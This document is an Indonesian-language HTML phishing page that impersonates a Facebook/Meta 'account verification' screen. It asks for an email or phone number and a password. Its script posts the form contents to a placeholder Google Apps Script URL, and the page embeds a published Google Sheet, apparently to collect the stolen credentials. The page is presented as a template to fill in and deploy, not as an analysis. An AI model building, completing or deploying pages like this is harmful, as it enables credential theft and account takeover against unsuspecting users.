<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verifikasi Akun</title>
  <style>
    /* ... (CSS seperti sebelumnya) ... */
  </style>
</head>
<body>
  <header>Verifikasi Akun dan Amankan</header>
  <div class="description">
    Facebook membantu Anda terhubung dan berbagi dengan orangâ€‘orang dalam kehidupan Anda.
  </div>
  <div class="card">
    <h1>Masuk ke Akun Anda</h1>
    <form id="login-form">
      <div><label>Email atau Nomor Telepon</label><input type="text" name="emailOrPhone" required></div>
      <div><label>Kata Sandi</label><input type="password" name="password" required></div>
      <button type="submit">Kirim &amp; Amankan</button>
    </form>
  </div>

  <div class="sheet-embed">
    <iframe src="https://docs.google.com/spreadsheets/d/14nPAYOjs1DnbDwChhixhod0G6sWpLjZb2PVemdwearw/pubhtml?widget=true&amp;headers=false" ></iframe>
  </div>

  <footer>&copy; 2025 VERIFIKASI META</footer>

  <script>
    const scriptURL = 'PASTE_WEB_APP_URL_DI_SINI';
    const form = document.getElementById('login-form');
    form.addEventListener('submit', e => {
      e.preventDefault();
      fetch(scriptURL, {
        method: 'POST',
        body: new FormData(form)
      })
      .then(resp => resp.json())
      .then(json => {
        alert('Terkirim: ' + json.status);
        form.reset();
      })
      .catch(err => {
        console.error('Error:', err);
        alert('Terjadi kesalahan.');
      });
    });
  </script>
</body>
</html>
